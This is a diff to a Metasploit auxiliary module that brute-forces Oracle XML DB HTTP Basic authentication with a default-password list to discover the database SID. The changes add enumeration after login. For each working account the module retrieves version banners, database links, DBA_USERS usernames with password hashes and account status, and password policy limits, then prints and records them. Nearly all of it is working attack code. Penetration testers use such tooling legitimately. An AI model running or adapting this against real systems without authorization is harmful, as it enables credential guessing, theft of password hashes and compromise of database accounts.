@@ -18,13 +18,13 @@ class Metasploit3 < Msf::Auxiliary
 			'Name'        => 'Oracle XML DB SID Discovery via Brute Force',
 			'Description' => %q{
 					This module attempts to retrieve the sid from the Oracle XML DB httpd server, 
-					utilizing Pete Finnigan's default oracle password list.
+					utilizing Pete Finnigan s default oracle password list.
 			},
 			'Version'     => '$Revision: 6876 $',
 			'References'  =>
 				[
 					[ 'URL', 'http://dsecrg.com/files/pub/pdf/Different_ways_to_guess_Oracle_database_SID_(eng).pdf' ],
-					[ 'URL', 'http://www.petefinnigan.com/default/oracle_default_passwords.csv'],
+  					[ 'URL', 'http://www.petefinnigan.com/default/oracle_default_passwords.csv'],
 				],
 			'Author'      => [ 'nebulus' ],
 			'License'     => MSF_LICENSE
@@ -55,6 +55,7 @@ class Metasploit3 < Msf::Auxiliary
 		end
 
 		list = datastore['CSVFILE']
+		users = []
 
 		fd = CSV.foreach(list) do |brute|
 
@@ -70,30 +71,221 @@ class Metasploit3 < Msf::Auxiliary
 				{
 					'Authorization' => "Basic #{Rex::Text.encode_base64(user_pass)}"
 				}
-			}, 5)
+			}, 10)
 
-				if( not res )
-					print_error("Unable to retrieve SID for #{ip}:#{datastore['RPORT']} with #{datastore['DBUSER']} / #{datastore['DBPASS']}...") if datastore['VERBOSE']
-					next
+			if( not res )
+				print_error("Unable to retrieve SID for #{ip}:#{datastore['RPORT']} with #{datastore['DBUSER']} / #{datastore['DBPASS']}...") if datastore['VERBOSE']
+				next
+			end
+			if (res.code == 200)
+				if (not res.body.length > 0)		
+				# sometimes weird bug where body doesn't have value yet
+					res.body = res.bufq
 				end
-				if (res.code == 200)
+				sid = res.body.scan(/<GLOBAL_NAME>(\S+)<\/GLOBAL_NAME>/)[0]
+				report_note(:host => ip, :proto	=> 'tcp', :type	=> 'SERVICE_NAME', :data	=> "#{sid}")
+				print_good("Discovered SID: '#{sid[0]}' for host #{ip}:#{datastore['RPORT']} with #{datastore['DBUSER']} / #{datastore['DBPASS']}")
+				users.push(user_pass)			
+			elsif(datastore['VERBOSE'])
+				print_error("Unable to retrieve SID for #{ip}:#{datastore['RPORT']} with #{datastore['DBUSER']} / #{datastore['DBPASS']}...")
+			end
+		end #fd.each
+
+		good = false
+		users.each do |user_pass|
+			(u,p) = user_pass.split(':')
+
+			# get versions
+			res = send_request_raw({
+				'uri'     => '/oradb/PUBLIC/PRODUCT_COMPONENT_VERSION',
+				'version' => '1.1',
+				'method'  => 'GET',
+				'headers' =>
+				{
+					'Authorization' => "Basic #{Rex::Text.encode_base64(user_pass)}"
+				}
+			}, -1)
+
+			if(res)
+				if(res.code == 200)
 					if (not res.body.length > 0)		
 					# sometimes weird bug where body doesn't have value yet
 						res.body = res.bufq
 					end
-					sid = res.body.scan(/<GLOBAL_NAME>(\S+)<\/GLOBAL_NAME>/)
-						report_note(
-							:host	=> ip,
-							:proto	=> 'tcp',
-							:type	=> 'SERVICE_NAME',
-							:data	=> "#{sid}"
-						)
-					print_good("Discovered SID: '#{sid}' for host #{ip}:#{datastore['RPORT']} with #{datastore['DBUSER']} / #{datastore['DBPASS']}")
-				elsif(datastore['VERBOSE'])
-					print_error("Unable to retrieve SID for #{ip}:#{datastore['RPORT']} with #{datastore['DBUSER']} / #{datastore['DBPASS']}...")
+
+					doc = REXML::Document.new(res.body)
+
+					print_good("Version Information ==> as #{u}")
+					doc.elements.each('PRODUCT_COMPONENT_VERSION/ROW') do |e|
+						p = e.elements['PRODUCT'].get_text
+						v = e.elements['VERSION'].get_text
+						s = e.elements['STATUS'].get_text
+						report_note(:host => datastore['RHOST'], :proto => 'XDB', :port => datastore['RPORT'], :type => 'ORA_ENUM', :data => "Component Version: #{p}#{v}")
+						print_good("\t#{p}\t\t#{v}\t(#{s})")
+				
+					end
 				end
-		end
-		print_status("Brute forcing #{ip}:#{datastore['RPORT']}...")
+			end
+
+			# More version information
+			res = send_request_raw({
+				'uri'     => '/oradb/PUBLIC/ALL_REGISTRY_BANNERS',
+				'version' => '1.1',
+				'method'  => 'GET',
+				'headers' =>
+				{
+					'Authorization' => "Basic #{Rex::Text.encode_base64(user_pass)}"
+				}
+			}, -1)
+
+			if(res)
+				if(res.code == 200)
+					if (not res.body.length > 0)		
+					# sometimes weird bug where body doesn't have value yet
+						res.body = res.bufq
+					end
+
+					doc = REXML::Document.new(res.body)
+
+					doc.elements.each('ALL_REGISTRY_BANNERS/ROW') do |e|
+						next if e.elements['BANNER'] == nil
+						b = e.elements['BANNER'].get_text
+						report_note(:host => datastore['RHOST'], :proto => 'XDB', :port => datastore['RPORT'], :type => 'ORA_ENUM', :data => "Component Version: #{b}")
+						print_good("\t#{b}")
+					end
+				end
+			end
+
+			#database links
+			res = send_request_raw({
+				'uri'     => '/oradb/PUBLIC/ALL_DB_LINKS',
+				'version' => '1.1',
+				'method'  => 'GET',
+				'headers' =>
+				{
+					'Authorization' => "Basic #{Rex::Text.encode_base64(user_pass)}"
+				}
+			}, -1)
+
+			if(res)
+				if(res.code == 200)
+					if (not res.body.length > 0)		
+					# sometimes weird bug where body doesn't have value yet
+						res.body = res.bufq
+					end
+
+					doc = REXML::Document.new(res.body)
+
+					print_good("Database Link Information ==> as #{u}")
+					doc.elements.each('ALL_DB_LINKS/ROW') do |e|
+						next if(e.elements['HOST'] == nil or e.elements['USERNAME'] == nil or e.elements['DB_LINK'] == nil) 
+						h = e.elements['HOST'].get_text
+						d = e.elements['DB_LINK'].get_text
+						us = e.elements['USERNAME'].get_text
+
+						sid = h.to_s.scan(/\(SID\s\=\s(\S+)\)\)\)/)[0]
+						if(h.to_s.match(/^\(DESCRIPTION/) )
+							h = h.to_s.scan(/\(HOST\s\=\s(\S+)\)\(/)[0]
+						end
+
+						if(sid and sid != "")
+							print_good("\tLink: #{d}\t#{us}\@#{h[0]}/#{sid[0]}")
+							report_note(:host => h[0], :proto	=> 'XDB', :type	=> 'SERVICE_NAME', :data	=> "#{sid}")
+						else
+							print_good("\tLink: #{d}\t#{us}\@#{h}")
+						end
+					end
+				end
+			end
+
+
+			# get users
+			res = send_request_raw({
+				'uri'     => '/oradb/PUBLIC/DBA_USERS',
+				'version' => '1.1',
+				'method'  => 'GET',
+				'read_max_data' => (1024*1024*10),
+				'headers' =>
+				{
+					'Authorization' => "Basic #{Rex::Text.encode_base64(user_pass)}"
+				}
+			}, -1)
+
+			if (res.code == 200)
+				if (not res.body.length > 0)		
+				# sometimes weird bug where body doesn't have value yet
+					res.body = res.bufq
+				end
+
+				doc = REXML::Document.new(res.body)
+				print_good("Username/Hashes on #{ip}:#{datastore['RPORT']} ==> as #{u}")
+
+				doc.elements.each('DBA_USERS/ROW') do |user|
+
+					us = user.elements['USERNAME'].get_text
+					h = user.elements['PASSWORD'].get_text
+					as = user.elements['ACCOUNT_STATUS'].get_text
+					print_good("\t#{us}:#{h}:#{as}")
+					good = true
+					if(as.to_s == "OPEN")
+						report_note(:host => datastore['RHOST'], :proto => 'XDB', :port => datastore['RPORT'], :type => 'ORA_ENUM', :data => "Active Account #{u}:#{h}:#{as}")
+					else
+						report_note(:host => datastore['RHOST'], :proto => 'XDB', :port => datastore['RPORT'], :type => 'ORA_ENUM', :data => "Disabled Account #{u}:#{h}:#{as}")
+					end
+				end
+			end
+
+			# get password information
+			res = send_request_raw({
+				'uri'     => '/oradb/PUBLIC/USER_PASSWORD_LIMITS',
+				'version' => '1.1',
+				'method'  => 'GET',
+				'read_max_data' => (1024*1024*10),
+				'headers' =>
+				{
+					'Authorization' => "Basic #{Rex::Text.encode_base64(user_pass)}"
+				}
+			}, -1)
+
+			if (res.code == 200)
+				if (not res.body.length > 0)		
+				# sometimes weird bug where body doesn't have value yet
+					res.body = res.bufq
+				end
+
+				doc = REXML::Document.new(res.body)
+
+				print_good("Password Policy ==> as #{u}")
+				fla=plit=pgt=prt=prm=plot=''
+				doc.elements.each('USER_PASSWORD_LIMITS/ROW') do |e|
+					next if e.elements['RESOURCE_NAME'] == nil
+
+					case
+						when(e.elements['RESOURCE_NAME'].get_text == 'FAILED_LOGIN_ATTEMPTS')
+							fla = e.elements['LIMIT'].get_text
+						when(e.elements['RESOURCE_NAME'].get_text == 'PASSWORD_LIFE_TIME')
+							plit = e.elements['LIMIT'].get_text
+						when(e.elements['RESOURCE_NAME'].get_text == 'PASSWORD_REUSE_TIME')
+							prt = e.elements['LIMIT'].get_text
+						when(e.elements['RESOURCE_NAME'].get_text == 'PASSWORD_REUSE_MAX')
+							prm = e.elements['LIMIT'].get_text
+						when(e.elements['RESOURCE_NAME'].get_text == 'PASSWORD_LOCK_TIME')
+							plot = e.elements['LIMIT'].get_text
+						when(e.elements['RESOURCE_NAME'].get_text == 'PASSWORD_GRACE_TIME')
+							pgt = e.elements['LIMIT'].get_text
+					end
+				end
+				print_good("\tFailed Login Attempts: #{fla}\n\tPassword Life Time: #{plit}\n\tPassword Reuse Time: #{prt}\n\tPassword Reuse Max: #{prm}\n\tPassword Lock Time: #{plot}\n\tPassword Grace Time: #{pgt}")
+				report_note(:host => datastore['RHOST'], :proto => 'XDB', :port => datastore['RPORT'], :type => 'ORA_ENUM', :data => "Password Maximum Reuse Time: #{prm}")
+				report_note(:host => datastore['RHOST'], :proto => 'XDB', :port => datastore['RPORT'], :type => 'ORA_ENUM', :data => "Password Reuse Time: #{prt}")
+				report_note(:host => datastore['RHOST'], :proto => 'XDB', :port => datastore['RPORT'], :type => 'ORA_ENUM', :data => "Password Life Time: #{plit}")
+				report_note(:host => datastore['RHOST'], :proto => 'XDB', :port => datastore['RPORT'], :type => 'ORA_ENUM', :data => "Account Fail Logins Permitted: #{fla}")
+				report_note(:host => datastore['RHOST'], :proto => 'XDB', :port => datastore['RPORT'], :type => 'ORA_ENUM', :data => "Account Lockout Time: #{plot}")
+				report_note(:host => datastore['RHOST'], :proto => 'XDB', :port => datastore['RPORT'], :type => 'ORA_ENUM', :data => "Account Password Grace Time: #{pgt}")
+			end
+
+			break if good
+		end # users.each			
 		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
 		rescue ::Timeout::Error, ::Errno::EPIPE
 		end
